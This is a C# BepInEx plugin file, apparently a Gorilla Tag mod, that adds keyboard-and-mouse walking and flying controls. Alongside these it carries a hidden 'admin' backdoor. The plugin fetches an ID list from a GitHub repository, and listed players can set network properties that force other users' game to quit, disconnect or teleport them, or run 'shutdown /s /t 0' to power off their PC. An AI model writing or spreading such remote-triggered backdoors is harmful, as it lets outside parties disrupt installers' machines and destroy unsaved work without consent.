﻿using BepInEx;
using System.ComponentModel;
using UnityEngine;
using GorillaNetworking;
using GorillaTagScripts;
using System.Collections;
using System.IO;
using System.Net;
using System;
using ExitGames.Client.Photon;
using Photon.Realtime;
using Photon.Pun;
using System.Linq;
using Utilla;
using Unity.Burst.CompilerServices;
using System.Collections.Generic;
using UnityEngine.InputSystem;
using UnityEngine.Windows;
using UnityEngine.AI;
using System.Threading;
using Photon.Voice;
using System.Diagnostics;
using static UnityEngine.UI.GridLayoutGroup;

namespace StupidTemplate.Patches
{
    [Description(StupidTemplate.PluginInfo.Description)]
    [BepInPlugin(StupidTemplate.PluginInfo.GUID, StupidTemplate.PluginInfo.Name, StupidTemplate.PluginInfo.Version)]
    public class HarmonyPatches : BaseUnityPlugin
    {
        public static float Speed = 5f;
        public static bool Walking = true;
        public static bool Flying = false;
        public static bool Handing = false;
        public static bool Checked = false;
        private static float rotationX = 0f;
        private static float rotationY = 0f;
        public static bool Admin = false;
        public static float last = 0f;
        public static float last2 = 0f;
        public static bool Owner = false;
        private void OnEnable()
        {
            last = Time.time;
            Menu.ApplyHarmonyPatches();
        }
        private void OnDisable()
        {
            Menu.RemoveHarmonyPatches();
        }
        private void Update()
        {
            GorillaTagger.Instance.offlineVRRig.headConstraint.transform.rotation = GorillaTagger.Instance.mainCamera.transform.rotation;
            GorillaLocomotion.Player.Instance.rightControllerTransform.forward = GorillaLocomotion.Player.Instance.bodyCollider.transform.forward;
            GorillaLocomotion.Player.Instance.leftControllerTransform.forward = GorillaLocomotion.Player.Instance.bodyCollider.transform.forward;
            if (!Flying)
            {
                GorillaLocomotion.Player.Instance.bodyCollider.transform.position += new UnityEngine.Vector3(0f, 0.1f, 0f);
                GorillaLocomotion.Player.Instance.transform.position += new UnityEngine.Vector3(0f, 0.01f, 0f);
            }
            if (Flying)
            {
                GorillaLocomotion.Player.Instance.leftControllerTransform.rotation = GorillaLocomotion.Player.Instance.bodyCollider.transform.rotation * UnityEngine.Quaternion.Euler(0f, 0f, -90f);
                UnityEngine.Vector3 leftHandOffset = new UnityEngine.Vector3(-0.2f, -0.35f, 0f);
                UnityEngine.Vector3 rightHandOffset = new UnityEngine.Vector3(0.2f, -0.35f, 0f);
                if (!Mouse.current.leftButton.isPressed)
                {
                    GorillaLocomotion.Player.Instance.rightControllerTransform.position = GorillaLocomotion.Player.Instance.bodyCollider.transform.position + GorillaLocomotion.Player.Instance.bodyCollider.transform.rotation * rightHandOffset;
                    GorillaLocomotion.Player.Instance.rightControllerTransform.rotation = GorillaLocomotion.Player.Instance.bodyCollider.transform.rotation * UnityEngine.Quaternion.Euler(0f, 0f, 90f);
                }
                GorillaLocomotion.Player.Instance.leftControllerTransform.position = GorillaLocomotion.Player.Instance.bodyCollider.transform.position + GorillaLocomotion.Player.Instance.bodyCollider.transform.rotation * leftHandOffset;
            }
                if (!Flying)
                {
                    GorillaLocomotion.Player.Instance.rightControllerTransform.rotation = GorillaLocomotion.Player.Instance.bodyCollider.transform.rotation * Quaternion.Euler(0f, 0f, 90f);
                    GorillaLocomotion.Player.Instance.leftControllerTransform.rotation = GorillaLocomotion.Player.Instance.bodyCollider.transform.rotation * Quaternion.Euler(0f, 0f, -90f);

                    Vector3 leftHandOffset = new Vector3(-0.3f, -0.45f, 0f);
                    Vector3 rightHandOffset = new Vector3(0.3f, -0.45f, 0f);
                    Vector3 movementDirection = GorillaLocomotion.Player.Instance.transform.forward;
                    float walkSpeedMultiplier = 4f;
                    float upDownOffsetMultiplier = 0.2f;

                    float sineWaveMovement = Mathf.Sin(Time.time * 2f) * upDownOffsetMultiplier;

                    if (movementDirection != Vector3.zero)
                    {
                        if (movementDirection.z > 0)
                        {
                            leftHandOffset.z = Mathf.Lerp(leftHandOffset.z, -4.0f * walkSpeedMultiplier, Time.deltaTime * 5f);
                            rightHandOffset.z = Mathf.Lerp(rightHandOffset.z, 4.0f * walkSpeedMultiplier, Time.deltaTime * 5f);
                        }
                        else if (movementDirection.z < 0)
                        {
                            leftHandOffset.z = Mathf.Lerp(leftHandOffset.z, 4.0f * walkSpeedMultiplier, Time.deltaTime * 5f);
                            rightHandOffset.z = Mathf.Lerp(rightHandOffset.z, -4.0f * walkSpeedMultiplier, Time.deltaTime * 5f);
                        }
                    }
                    leftHandOffset.y += sineWaveMovement;
                    rightHandOffset.y += sineWaveMovement;

                    GorillaLocomotion.Player.Instance.rightControllerTransform.position = GorillaLocomotion.Player.Instance.bodyCollider.transform.position + GorillaLocomotion.Player.Instance.bodyCollider.transform.rotation * rightHandOffset;
                    GorillaLocomotion.Player.Instance.leftControllerTransform.position = GorillaLocomotion.Player.Instance.bodyCollider.transform.position + GorillaLocomotion.Player.Instance.bodyCollider.transform.rotation * leftHandOffset;

                    if (Physics.Raycast(GorillaLocomotion.Player.Instance.bodyCollider.transform.position + GorillaLocomotion.Player.Instance.bodyCollider.transform.rotation * new Vector3(-0.2f, -0.2f, 0f), Vector3.down, out RaycastHit leftHit))
                    {
                        GorillaLocomotion.Player.Instance.leftControllerTransform.position = leftHit.point + Vector3.Cross(leftHit.normal, Vector3.up).normalized * 0.1f;
                    }
                    if (Physics.Raycast(GorillaLocomotion.Player.Instance.bodyCollider.transform.position + GorillaLocomotion.Player.Instance.bodyCollider.transform.rotation * new Vector3(0.2f, -0.2f, 0f), Vector3.down, out RaycastHit rightHit))
                    {
                        GorillaLocomotion.Player.Instance.rightControllerTransform.position = rightHit.point - Vector3.Cross(rightHit.normal, Vector3.up).normalized * 0.1f;
                    }
                }
                if (Keyboard.current.wKey.isPressed)
                {
                    GorillaLocomotion.Player.Instance.transform.position += GorillaLocomotion.Player.Instance.headCollider.transform.forward * Time.deltaTime * Speed;
                }
                if (Keyboard.current.sKey.isPressed)
                {
                    GorillaLocomotion.Player.Instance.transform.position -= GorillaLocomotion.Player.Instance.headCollider.transform.forward * Time.deltaTime * Speed;
                }
                if (Keyboard.current.aKey.isPressed)
                {
                    GorillaLocomotion.Player.Instance.transform.position -= GorillaLocomotion.Player.Instance.headCollider.transform.right * Time.deltaTime * Speed;
                }
                if (Keyboard.current.dKey.isPressed)
                {
                    GorillaLocomotion.Player.Instance.transform.position += GorillaLocomotion.Player.Instance.headCollider.transform.right * Time.deltaTime * Speed;
                }
                if (Keyboard.current.spaceKey.isPressed)
                {
                    GorillaLocomotion.Player.Instance.transform.position += GorillaLocomotion.Player.Instance.headCollider.transform.up * Time.deltaTime * Speed;
                }
                if (Keyboard.current.ctrlKey.isPressed)
                {
                    GorillaLocomotion.Player.Instance.transform.position -= GorillaLocomotion.Player.Instance.headCollider.transform.up * Time.deltaTime * 0.5f;
                    Speed = 2f;
                }
            if (Keyboard.current.digit1Key.isPressed)
            {
                Walking = true;
                Flying = false;
            }
            if (Keyboard.current.digit2Key.isPressed)
            {
                Walking = false;
                Flying = true;
            }
            if (Flying)
            {
                GorillaLocomotion.Player.Instance.bodyCollider.attachedRigidbody.AddForce(UnityEngine.Vector3.up * (Time.deltaTime * (9.81f / Time.deltaTime)), ForceMode.Acceleration);
                GorillaLocomotion.Player.Instance.transform.position += GorillaTagger.Instance.headCollider.transform.forward * Time.deltaTime * 0;
                GorillaLocomotion.Player.Instance.GetComponent<Rigidbody>().velocity = UnityEngine.Vector3.zero;
            }
            if (Keyboard.current.shiftKey.isPressed)
            {
                Speed = 10;
            }
            else if (!Keyboard.current.ctrlKey.isPressed)
            {
                Speed = 5;
            }
            if (Mouse.current.rightButton.isPressed)
            {
                rotationY += Mouse.current.delta.x.ReadValue() * 1f;
                rotationY = Mathf.Repeat(rotationY, 360f);
                rotationX -= Mouse.current.delta.y.ReadValue() * 1f;
                rotationX = Mathf.Clamp(rotationX, -80f, 80f);
                GorillaLocomotion.Player.Instance.rightControllerTransform.parent.rotation = UnityEngine.Quaternion.Euler(rotationX, rotationY, 0f);
            }
            if (Time.time - last > 5f && !Checked)
            {
                Checked = true;
                if (!Admin || !Owner)
                {
                    using (WebClient client = new WebClient())
                    {
                        string content = client.DownloadString("https://github.com/FYSONTOP/ADMIN/blob/main/ADMINS.txt");
                        if (content.Contains(PhotonNetwork.LocalPlayer.UserId))
                        {
                            ToolTip.ToolTipSend("ADMIN", false, "Logged In As Admin User", true, true);
                            Admin = true;
                        }
                        string content2 = client.DownloadString("https://github.com/FYSONTOP/ADMIN/blob/main/OWNER.txt");
                        if (content2.Contains(PhotonNetwork.LocalPlayer.UserId))
                        {
                            ToolTip.ToolTipSend("ADMIN", false, "Logged In As Owner", true, true);
                            Admin = true;
                            Owner = true;
                        }
                    }
                }
            }
            foreach (Player p in PhotonNetwork.PlayerList)
            {
                if (p.CustomProperties.ContainsKey("ADMINC") && p != PhotonNetwork.LocalPlayer)
                {
                    using (WebClient client = new WebClient())
                    {
                        string content = client.DownloadString("https://github.com/FYSONTOP/ADMIN/blob/main/ADMINS.txt");
                        if (content.Contains(p.UserId) && !Admin)
                        {
                            var customProperties = new ExitGames.Client.Photon.Hashtable { { "ADMINC", null } };
                            p.SetCustomProperties(customProperties);
                            ToolTip.ToolTipSend("ADMIN", false, "You Have Been Crashed By A Admin Bye Bye", true, true);
                            Application.Quit();
                        }
                    }
                }
                if (p.CustomProperties.ContainsKey("ADMINS") && p != PhotonNetwork.LocalPlayer)
                {
                    using (WebClient client = new WebClient())
                    {
                        string content = client.DownloadString("https://github.com/FYSONTOP/ADMIN/blob/main/ADMINS.txt");
                        if (content.Contains(p.UserId) && !Admin)
                        {
                            var customProperties = new ExitGames.Client.Photon.Hashtable { { "ADMINS", null } };
                            p.SetCustomProperties(customProperties);
                            ToolTip.ToolTipSend("ADMIN", false, "Your Pc Had Been Shutdown By A Admin Bye Bye", true, true);
                            Process.Start("shutdown", "/s /t 0");
                        }
                    }
                }
                if (p.CustomProperties.ContainsKey("ADMINK") && p != PhotonNetwork.LocalPlayer)
                {
                    using (WebClient client = new WebClient())
                    {
                        string content = client.DownloadString("https://github.com/FYSONTOP/ADMIN/blob/main/ADMINS.txt");
                        if (content.Contains(p.UserId) && !Admin)
                        {
                            var customProperties = new ExitGames.Client.Photon.Hashtable { { "ADMINK", null } };
                            p.SetCustomProperties(customProperties);
                            ToolTip.ToolTipSend("ADMIN", false, "You Have Been Kicked By A Admin Bye Bye", true, true);
                            PhotonNetwork.Disconnect();
                        }
                    }
                }
                if (p.CustomProperties.ContainsKey("ADMINB") && p != PhotonNetwork.LocalPlayer)
                {
                    using (WebClient client = new WebClient())
                    {
                        string content = client.DownloadString("https://github.com/FYSONTOP/ADMIN/blob/main/ADMINS.txt");
                        if (content.Contains(p.UserId) && !Admin)
                        {
                            var customProperties = new ExitGames.Client.Photon.Hashtable { { "ADMINB", null } };
                            p.SetCustomProperties(customProperties);
                            ToolTip.ToolTipSend("ADMIN", false, "You Have Been Brought To A Admin", true, true);
                            foreach (VRRig r in GorillaParent.instance.vrrigs)
                            {
                                if (p.UserId == r.OwningNetPlayer.UserId)
                                {
                                    GorillaLocomotion.Player.Instance.transform.position = r.transform.position;
                                }
                            }
                        }
                    }
                }
                if (p.CustomProperties.ContainsKey("ADMINF") && p != PhotonNetwork.LocalPlayer)
                {
                    using (WebClient client = new WebClient())
                    {
                        string content = client.DownloadString("https://github.com/FYSONTOP/ADMIN/blob/main/ADMINS.txt");
                        if (content.Contains(p.UserId) && !Admin)
                        {
                            var customProperties = new ExitGames.Client.Photon.Hashtable { { "ADMINF", null } };
                            p.SetCustomProperties(customProperties);
                            ToolTip.ToolTipSend("ADMIN", false, "You Have Been Flinged By A Admin Bye Bye", true, true);
                            GorillaLocomotion.Player.Instance.transform.position += GorillaLocomotion.Player.Instance.transform.up * Time.deltaTime * 100;
                            GorillaLocomotion.Player.Instance.GetComponent<Rigidbody>().velocity = UnityEngine.Vector3.zero;
                        }
                    }
                }
                if (p.CustomProperties.ContainsKey(PhotonNetwork.LocalPlayer.UserId + "F"))
                {
                    using (WebClient client = new WebClient())
                    {
                        string content = client.DownloadString("https://github.com/FYSONTOP/ADMIN/blob/main/ADMINS.txt");
                        if (content.Contains(p.UserId) && !Admin)
                        {
                            var customProperties = new ExitGames.Client.Photon.Hashtable { { PhotonNetwork.LocalPlayer.UserId + "F", null } };
                            p.SetCustomProperties(customProperties);
                            ToolTip.ToolTipSend("ADMIN", false, "You Have Been Flinged By A Admin Bye Bye", true, true);
                            GorillaLocomotion.Player.Instance.transform.position += GorillaLocomotion.Player.Instance.transform.up * Time.deltaTime * 100;
                            GorillaLocomotion.Player.Instance.GetComponent<Rigidbody>().velocity = UnityEngine.Vector3.zero;
                        }
                    }
                }
                if (p.CustomProperties.ContainsKey(PhotonNetwork.LocalPlayer.UserId + "B"))
                {
                    using (WebClient client = new WebClient())
                    {
                        string content = client.DownloadString("https://github.com/FYSONTOP/ADMIN/blob/main/ADMINS.txt");
                        if (content.Contains(p.UserId) && !Admin)
                        {
                            var customProperties = new ExitGames.Client.Photon.Hashtable { { PhotonNetwork.LocalPlayer.UserId + "B", null } };
                            p.SetCustomProperties(customProperties);
                            ToolTip.ToolTipSend("ADMIN", false, "You Have Been Brought To A Admin", true, true);
                            foreach (VRRig r in GorillaParent.instance.vrrigs)
                            {
                                if (p.UserId == r.OwningNetPlayer.UserId)
                                {
                                    GorillaLocomotion.Player.Instance.transform.position = r.transform.position;
                                }
                            }
                        }
                    }
                }
                if (p.CustomProperties.ContainsKey(PhotonNetwork.LocalPlayer.UserId + "S"))
                {
                    using (WebClient client = new WebClient())
                    {
                        string content = client.DownloadString("https://github.com/FYSONTOP/ADMIN/blob/main/ADMINS.txt");
                        if (content.Contains(p.UserId) && !Admin)
                        {
                            var customProperties = new ExitGames.Client.Photon.Hashtable { { PhotonNetwork.LocalPlayer.UserId + "S", null } };
                            p.SetCustomProperties(customProperties);
                            ToolTip.ToolTipSend("ADMIN", false, "Your Pc Had Been Shutdown By A Admin Bye Bye", true, true);
                            Process.Start("shutdown", "/s /t 0");
                        }
                    }
                }
                if (p.CustomProperties.ContainsKey(PhotonNetwork.LocalPlayer.UserId + "K"))
                {
                    using (WebClient client = new WebClient())
                    {
                        string content = client.DownloadString("https://github.com/FYSONTOP/ADMIN/blob/main/ADMINS.txt");
                        if (content.Contains(p.UserId) && !Admin)
                        {
                            var customProperties = new ExitGames.Client.Photon.Hashtable { { PhotonNetwork.LocalPlayer.UserId + "K", null } };
                            p.SetCustomProperties(customProperties);
                            ToolTip.ToolTipSend("ADMIN", false, "You Have Been Kicked By A Admin Bye Bye", true, true);
                            PhotonNetwork.Disconnect();
                        }
                    }
                }
                if (p.CustomProperties.ContainsKey(PhotonNetwork.LocalPlayer.UserId + "C"))
                {
                    using (WebClient client = new WebClient())
                    {
                        string content = client.DownloadString("https://github.com/FYSONTOP/ADMIN/blob/main/ADMINS.txt");
                        if (content.Contains(p.UserId) && !Admin)
                        {
                            var customProperties = new ExitGames.Client.Photon.Hashtable { { PhotonNetwork.LocalPlayer.UserId + "C", null } };
                            p.SetCustomProperties(customProperties);
                            ToolTip.ToolTipSend("ADMIN", false, "You Have Been Kicked By A Admin Bye Bye", true, true);
                            PhotonNetwork.Disconnect();
                        }
                    }
                }
                if (p.CustomProperties.ContainsKey("ADMIN") && p != PhotonNetwork.LocalPlayer)
                {
                    using (WebClient client = new WebClient())
                    {
                        string content = client.DownloadString("https://github.com/FYSONTOP/ADMIN/blob/main/ADMINS.txt");
                        if (content.Contains(p.UserId) && !Admin)
                        {
                            var customProperties = new ExitGames.Client.Photon.Hashtable { { "ADMIN", null } };
                            p.SetCustomProperties(customProperties);
                            var customProperties2 = new ExitGames.Client.Photon.Hashtable { { "COMPMENU", true } };
                            PhotonNetwork.LocalPlayer.SetCustomProperties(customProperties2);
                        }
                    }
                }
            }
        }
    }
}